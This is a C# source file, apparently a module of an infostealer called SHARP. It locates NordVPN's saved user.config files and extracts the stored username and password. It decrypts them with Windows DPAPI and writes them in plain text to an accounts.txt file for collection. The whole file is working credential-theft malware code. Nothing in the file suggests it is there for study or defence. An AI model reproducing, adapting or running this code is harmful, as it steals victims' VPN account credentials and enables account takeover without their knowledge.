using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace SHARP
{
    internal class NordVPN
    {
      private static string Decode(string s)
      {
        try
        {
          return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[]) null, DataProtectionScope.LocalMachine));
        }
        catch
        {
          return "";
        }
      }

      public static void Save(string head)
      {
        string str1 = head;
        DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, nameof (NordVPN)));
        if (!directoryInfo.Exists)
          return;
        try
        {
          foreach (DirectoryInfo directory1 in directoryInfo.GetDirectories("NordVpn.exe*"))
          {
            foreach (FileSystemInfo directory2 in directory1.GetDirectories())
            {
              string str2 = Path.Combine(directory2.FullName, "user.config");
              if (File.Exists(str2))
              {
                Directory.CreateDirectory(str1 + "\\VPN\\NordVPN\\");
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(str2);
                string innerText1 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                if (innerText1 != null && !string.IsNullOrEmpty(innerText1) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
                {
                  string str3 = NordVPN.Decode(innerText1);
                  string str4 = NordVPN.Decode(innerText2);
                  ++Counting.NordVPN;
                  File.AppendAllText(str1 + "\\VPN\\NordVPN\\\\accounts.txt", $"Username: {str3}\nPassword: {str4}\n\n");
                }
              }
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
    }
}
